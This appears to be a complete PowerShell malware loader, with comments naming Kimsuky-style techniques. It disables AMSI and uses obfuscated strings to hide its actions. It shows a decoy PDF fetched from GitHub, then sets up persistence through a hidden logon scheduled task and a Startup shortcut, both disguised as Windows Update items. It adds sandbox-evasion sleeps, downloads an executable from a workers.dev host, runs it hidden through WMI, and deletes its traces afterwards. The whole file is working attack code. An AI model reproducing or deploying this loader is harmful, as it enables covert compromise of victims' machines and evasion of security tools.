$ErrorActionPreference = 'SilentlyContinue'

# === LAYERED AMSI BYPASS ===
try {
    # Method 1: Patch amsiInitFailed
    $a = [Ref].Assembly.GetType(('System.Management.Automation.'+[char]65+'msiUtils'))
    $a.GetField(('amsiInitFailed'),('NonPublic,Static')).SetValue($null,$true)
} catch {}
try {
    # Method 2: Registry provider redirection (Kimsuky style)
    $k = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey(('SOFTWARE\Microsoft\AMSI\Providers'), $true)
    if ($k) { $k.DeleteSubKey('{2781761E-28E0-4109-99FE-B9D127C57AFE}'); $k.Close() }
} catch {}

# === RANDOM JITTER (Initial) ===
Start-Sleep -Milliseconds (Get-Random -Min 300 -Max 800)

# === OBFUSCATED PATHS (String Splitting) ===
$ap = [char]65+[char]112+[char]112+[char]68+[char]97+[char]116+[char]97
$mi = [char]77+[char]105+[char]99+[char]114+[char]111+[char]115+[char]111+[char]102+[char]116
$wi = [char]87+[char]105+[char]110+[char]100+[char]111+[char]119+[char]115
$ca = [char]67+[char]97+[char]99+[char]104+[char]101+[char]115
$cache = "$env:$ap\$mi\$wi\$ca"
if (-not (Test-Path $cache)) { & ([char]78+[char]101+[char]119)+'-Item' -ItemType Directory -Path $cache -Force | Out-Null }

# === FLAG FILE (Obfuscated) ===
$flag = "$cache\"+([char]105+[char]110+[char]115+[char]116+[char]97+[char]108+[char]108+[char]101+[char]100)+'.'+([char]102+[char]108+[char]97+[char]103)
$isFirst = -not (Test-Path $flag)

# === PDF URL (Base64 Obfuscated) ===
$pdfUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FzdHJvLW9wZW5zb3VyY2UvY2xvdWQtc3luYy10b29scy9tYWluL2Fzc2V0cy9OYWthel9Oby5fNjYxX3ZpZF8wMi4wMy4yMDI2LTQucGRm'))
$pdfPath = "$cache\"+([char]78+[char]97+[char]107+[char]97+[char]122)+'_No._661_vid_02.03.2026-4.pdf'

$headers = @{'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'}

# === IMMEDIATE PDF DECOY ===
if ($isFirst) {
    if (-not (Test-Path $pdfPath)) {
        try { & ([char]73+[char]110+[char]118+[char]111+[char]107+[char]101)+'-WebRequest' -Uri $pdfUrl -OutFile $pdfPath -Headers $headers -UseBasicParsing } catch {}
    }
    if (Test-Path $pdfPath) {
        try { & ([char]83+[char]116+[char]97+[char]114+[char]116)+'-Process' $pdfPath } catch {}
        & ([char]78+[char]101+[char]119)+'-Item' -Path $flag -ItemType File -Force | Out-Null
    }
}

# === SELF-PRESERVATION (Obfuscated) ===
$local = "$cache\"+([char]108+[char]97+[char]117+[char]110+[char]99+[char]104+[char]101+[char]114)+'.ps1'
$curr = $MyInvocation.MyCommand.Path

function Save-ScriptToDisk {
    param([string]$D)
    $d = Split-Path $D -Parent
    if (-not (Test-Path $d)) { & ([char]78+[char]101+[char]119)+'-Item' -ItemType Directory -Path $d -Force | Out-Null }
    if (-not $curr -or $curr -eq '') {
        try {
            $raw = "https://raw.githubusercontent.com/astro-opensource/cloud-sync-tools/refs/heads/main/assets/launcher.ps1"
            (& ([char]78+[char]101+[char]119)+'-Object' Net.WebClient).DownloadFile($raw, $D)
        } catch { exit }
    } else {
        Copy-Item $curr $D -Force
    }
    return $D
}
$scriptPath = Save-ScriptToDisk -Destination $local

# === KIMSUKY-STYLE XML SCHEDULED TASK ===
$taskName = ([char]87+[char]105+[char]110+[char]100+[char]111+[char]119+[char]115)+'UpdateTask'
$xmlTask = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <LogonTrigger><Enabled>true</Enabled></LogonTrigger>
  </Triggers>
  <Actions Context="Author">
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>-ExecutionPolicy Bypass -WindowStyle Hidden -File "$scriptPath"</Arguments>
    </Exec>
  </Actions>
  <Settings>
    <Hidden>true</Hidden>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <StartWhenAvailable>true</StartWhenAvailable>
  </Settings>
</Task>
"@
$xmlPath = "$env:TEMP\task.xml"
$xmlPath = "$env:TEMP\task.xml"
try {
    $xmlTask | Out-File -FilePath $xmlPath -Encoding Unicode -Force
    & ([char]115+[char]99+[char]104+[char]116+[char]97+[char]115+[char]107+[char]115) /create /tn $taskName /xml $xmlPath /f
    Remove-Item $xmlPath -Force
} catch {}

# === HIDDEN + SYSTEM FOLDER (Anti-Forensics) ===
try { & ([char]97+[char]116+[char]116+[char]114+[char]105+[char]98) +h +s $cache } catch {}

# === STARTUP LNK (Backup) ===
$startup = "$env:$ap\$mi\$wi\Start Menu\Programs\Startup"
$lnk = "$startup\WindowsUpdateHelper.lnk"
if (-not (Test-Path $lnk)) {
    try {
        $wsh = & ([char]78+[char]101+[char]119)+'-Object' -ComObject WScript.Shell
        $sc = $wsh.CreateShortcut($lnk)
        $sc.TargetPath = 'powershell.exe'
        $sc.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""
        $sc.WindowStyle = 7
        $sc.Save()
    } catch {}
}

# === RANDOM JITTER BEFORE BEARFOOS DELAY ===
Start-Sleep -Seconds (Get-Random -Min 5 -Max 15)

# === BEARFOOS EVASION DELAY ===
Start-Sleep -Seconds (Get-Random -Min 45 -Max 90)

# === EXE URL (Worker) ===
$exeUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9hZ2VkLW1vdW50YWluLTYxNGIubmF0YWxpYS1rdXNoODIud29ya2Vycy5kZXYvdXBkYXRl'))
$exePath = "$cache\helper.exe"

# === DOWNLOAD & EXECUTE WITH RETRY ===
if (-not (Test-Path $exePath)) {
    $r = 0; $m = 3
    do {
        try {
            (& ([char]78+[char]101+[char]119)+'-Object' Net.WebClient).DownloadFile($exeUrl, $exePath)
            break
        } catch {
            $r++
            Start-Sleep -Seconds (Get-Random -Min 3 -Max 8)
        }
    } while ($r -lt $m)
}

if (Test-Path $exePath) {
    Start-Sleep -Milliseconds (Get-Random -Min 200 -Max 600)
    try {
        & ([char]73+[char]110+[char]118+[char]111+[char]107)+'e-WmiMethod' -Class Win32_Process -Name Create -ArgumentList "`"$exePath`"" -ErrorAction Stop | Out-Null
    } catch {
        try {
            (& ([char]78+[char]101+[char]119)+'-Object' -ComObject WScript.Shell).Run("`"$exePath`"", 0, $false)
        } catch {
            & ([char]83+[char]116)+'art-Process' $exePath -WindowStyle Hidden
        }
    }
}

# === CLEANUP ===
Start-Job -ScriptBlock {
    param($e, $p)
    Start-Sleep -Seconds (Get-Random -Min 280 -Max 320)
    Remove-Item $e, $p -Force -ErrorAction SilentlyContinue
} -ArgumentList $exePath, $pdfPath | Out-Null
